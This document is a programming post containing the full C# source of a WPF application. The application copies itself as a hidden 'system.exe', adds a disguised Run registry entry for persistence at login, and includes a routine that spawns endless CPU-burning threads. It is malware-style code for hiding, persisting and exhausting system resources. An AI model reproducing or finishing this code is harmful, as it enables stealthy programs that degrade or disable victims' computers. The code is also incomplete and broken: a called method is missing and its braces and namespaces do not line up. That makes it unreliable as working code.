#programowanie
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;

namespace WpfApplication_OKSANA
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public static string needPatch = "C:\\Users\\Public\\";


        public MainWindow()
        {
            if (OSVersionInfo.Name == "Windows 7" || OSVersionInfo.Name == "Windows Vista" )
            {
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }
            else
                if (OSVersionInfo.Name == "Windows XP")
            {
                needPatch = "C:\\Documents and Settings\\All Users\\";
                autorun.SetAutorunValue(true, needPatch + "system.exe"); // добавить в автозагрузку
                                                                         //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
            }

            InitializeComponent();
        }
         private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            if (!File.Exists(needPatch + "system.exe"))
            {
                try
                {
                    File.Copy("system.exe", needPatch + "system.exe");
                    File.SetAttributes(needPatch + "system.exe", FileAttributes.Hidden);

                }
                catch {   }
            }
            start();
        }

        public static void sys_sleep()
        {
            while (true)
            {
                Thread s = new Thread(s_b);
                s.Start();
            }
        }
        private static void s_b()
        {
            int y = 2;
            while (true)
            {
                y *= y;
            }
        }
        public class autorun: Singleton<autorun>
    {
        public static bool SetAutorunValue(bool autorun, string npath)
        {
            const string name = "systems";
            string ExePath = npath;
            RegistryKey reg;

            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue(name, ExePath);
                else
                    reg.DeleteValue(name);
                reg.Flush();
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
namespace DoFactory.GangOfFour.Singleton.Structural
{
    public class Singleton<T> where T : class
    {
        private static T _instance;

        protected Singleton()
        {
        }

        private static T CreateInstance()
        {
            ConstructorInfo cInfo = typeof(T).GetConstructor(
            BindingFlags.Instance | BindingFlags.NonPublic,
            null,
            new Type[0],
            new ParameterModifier[0]);

            return (T)cInfo.Invoke(null);
        }

        public static T Instance
        {
            get
            {
                if (_instance == null)
                {
                    _instance = CreateInstance();
                }

                return _instance;
            }
        }
    }
}
        
